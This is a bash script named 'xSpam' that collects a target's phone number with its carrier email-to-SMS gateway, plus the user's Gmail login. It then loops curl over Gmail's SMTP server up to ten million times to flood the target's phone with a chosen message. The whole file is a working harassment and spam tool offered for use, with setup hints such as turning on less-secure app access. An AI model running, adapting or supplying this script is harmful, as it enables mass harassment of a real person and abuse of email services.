#! /bin/bash

#Colors: 35-Magenta,36-Cyan,92-LightGreen,31-Red

clear



echo '----------------------------------------------'
echo -e "xSpam - xrchsploit \e[35m" 
echo '----------------------------------------------'
echo -e "   ig: xrchsploit  \e[36m"
echo '----------------------------------------------'
echo 'In order to use this tool you are going to need a gmail account'
echo ' '
echo -e "Steps on how to turn on less secure apps here \e[92m" 
echo ' '
echo 'Must have less secure apps turned on'
echo ' '
echo -e "https://youtube.com/BPFkiLnN6h0 \e[96m" 

echo "Must use a GMAIL account ^"
#Author stuff ^
echo ' '
echo -e  "To find the carrier go to https://www.freecarrierlookup.com/ \e[101m"
echo ' '
echo -e      "\e[40m"
echo -e      "\e[5m"

read -p 'Phone # of the target with the email extension behind it: ' phonenumber
echo -e      "OK \e[0m" 
echo " "
echo "Target is: $phonenumber"
echo " "
read -p "Email of the Gmail account you're going to use: " email
echo -e "\e[95m"
echo ' '
echo -e "Email in use is: $email \e[1m"

read -s -p "Password for the Gmail account: " password 
echo -e "\e[0m"
echo " " 
read -p "Message send (keep it small): " Message

echo OK
echo " "
echo "TO STOP SENDING MESSAGES CTRL + C SHOULD STOP THEM"

truncate -s 0 text.txt

echo $Message >> text.txt

#below is the send command that sends the messages using curls

for n in {1..10000000}; do curl --url "smtps://smtp.gmail.com:465" --ssl-reqd --mail-from $email:$password --mail-rcpt $phonenumber --upload-file text.txt --user $email:$password --insecure; done
 


